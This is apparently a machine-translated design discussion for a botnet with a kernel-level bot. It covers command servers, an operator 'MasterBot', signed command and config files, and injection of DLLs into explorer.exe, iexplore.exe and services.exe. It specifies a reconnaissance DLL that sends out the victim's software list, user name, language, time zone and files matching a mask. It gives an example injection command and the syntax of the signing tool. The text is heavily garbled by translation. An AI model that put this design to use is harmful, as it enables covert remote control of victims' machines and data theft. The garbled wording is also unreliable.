1) Format Config. Boat because we have transformed into a server on the pitch. So
Communication server only with the bot comes in a format that you are asking. For debugging
we are well able to look like the contents of the config, but better
optimize its safety and for your convenience.

2) other matters at its discretion. All that would be reflected in the TOR.
Let's first make a base on it and then we'll cheat. Now we go into the
yuzeragentov discuss what is necessary to put a bot server masterbota yet. GET
POST, or let him decide cheater.

Boat : able to receive files from the server to write to the vfs and run , can delete files
of vfs, can return the content vfs ( tell the server what dll successfully
loading ) , has a unique Haydee , who can transfer dll ( eg
through file 1726353.bid (bot id) which is at the vfs), is able to list
server at specified intervals to receive instructions , can initiate inject
dll ( located in the vfs) in the process .

Server: receives from the bot information recorded in the database, receives MasterBota
instructions for bots (in fact, for each boat has its own guide , maybe the database is updated
and update the database at a particular bot which the file can be removed and which is
added ) returns MasterBotu dump the database for analysis and a sid (server id). Incidentally,
The database can be stored on the vfs ( work with) and simply transfer it MasterBotu and
MasterBota received from new over the old one to overwrite . It is only necessary for the database
provide versioning .

MasterBot communicates with the server, gets the current database, instructs
(Actually updates the database) for bots, transfers dll, which is in the database.

MasterBot received from the database server lays out in its local folder. C: \ brownie_db \
To provide masterbota start with parameters: ip server, the path to the database, which
it is necessary to fill in the destination ip. Run masterbot with the parameters he knocks on the ip,
poluchetsya database from the server transmits its disabled.

We said that the communication server and encrypted bot. When you create a bot and server
masterbota need them to sign the certificate. Bot did not listen to someone else's server,
the server has not received instructions from someone else masterbota. As this moment to protect?

The database contains: Haydee bot contents vfs, date of last otstuk .
I think for each server to determine the maximum number of serviced bots ,
Nk example , if the server banging bot is not in the list of Nk , the server
will block the connection. What For? 1 ) we manage stress , 2 ) to transfer the database masterbotu
where a limited number of records is always faster . 3 ) MasterBot itself will be removed from the database
old boots .

If there is a free cheater , then we can make a small dll to collect information about the target
system. In order not to sew it into the loader . 

What will be able to:

- When creating sutured it to the list of URLs ostuka
- Ticking off at the start and every N hours (specified in the configuration )
- Returns a list of installed software
- Returns the configuration PC
- Returns the user name
- Returns the system language
- Returns the time zone
- Drawn to the url, it requests a file path , which must be returned .
- Drawn to the url, queries mask , returns a list of files to appropriate mask.

This outdated information . The project is using kernelnogo bot implies that
 Any DLL will be loaded from a bot network. Poet configuration files to build the installer does not
 provide information to attach to the DLL driver.
Let us know if this functionality is required, - make appropriate configs .

 Config file for a specific bot ( or group of bots ) is given by a team of SET_CONFIG MB.
 Boat requests configuration timer (parameter ConfigPeriod in KBOT.INI).
 This is the same INI file , it is stored in the bots VFS and used in the future.
 Example KBOT.INI folder \ BkBuild.

 Sign the file can be a utility CT (BSRV \ CT), or if the secret key is attached to the MB32 ( 64 ) .EXE is
 signed file automatically when loading it to the server ( and the team SET_TASK SET_CONFIG).

> the same with the teams , it is not clear how to shape the text file

 A text file is generated with any text editor . Encoding - ANSI. Signed by the utility CT:
CT -s < secret key > < source file > < output file >
 or, if the private key is attached to the MB32 ( 64 ) .EXE is
 signed file automatically when loading it to the server ( and the team SET_TASK SET_CONFIG).

 No , SET_TASK SET_CONFIG and charged with one file or a group of bots bot .
 The command file can be several teams, each must begin on a new line .

an example of the file:

; under the name my.dll
SET_INJECT my.dll explorer.exe iexplore.exe; asks to inject MY.DLL in the process explorer.exe and iexplore.exe

 The user ID , the time the record was created , last otstuk , IP and User-Agent record was created ,
 IP and User-Agent last otstuk , ID group , the current configuration file ( name , CRC32, installation date )
 the current command file ( name , CRC32, installation date ) .
Now the database is stored in an internal format of the server. Tool to Convert give with the first update.

Sign itself if the utility was attached a secret key. This is done by running the bat- nick
 bkbuild \ bkbuild.bat.

Yes. If you have multiple servers , you need the trailer to each in turn.
How to do better?

 That's right . You can specify inject server.dll in any system process , such as services.exe.

Assuming that the file or subscribes to the local computer operator , or,
 uploaded to the server utility MB.EXE, which contains the secret key again, with
 local computer operator .
 Under this scheme seketny key only on the computer operator .
